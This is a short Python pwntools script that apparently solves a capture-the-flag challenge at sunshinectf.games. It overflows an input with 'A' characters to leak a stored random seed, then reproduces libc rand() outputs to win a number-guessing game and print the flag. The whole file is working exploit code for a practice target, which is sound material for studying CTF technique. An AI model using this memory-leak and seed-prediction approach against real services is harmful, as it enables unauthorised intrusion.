from ctypes import *
from pwn import *

context.encoding = "latin1"

libc = CDLL("libc.so.6")

# io = process("./ctf-simulator")
io = remote("sunshinectf.games", 22000)

io.clean()
io.sendline("A" * 100)
io.recvuntil(b"A" * 20)
i = 10
za_seed = io.recv(4)
za_seed = u32(za_seed)
print(f"Leaked Seed: {za_seed}")
libc.srand(za_seed)
rand_val = (libc.rand() % i) + 1
io.sendline(str(rand_val))
while True:
    out = io.clean()
    i *= 10
    rand_val = (libc.rand() % i) + 1
    io.sendline(str(rand_val))
    if b"sun" in out:
        print(out)
        break
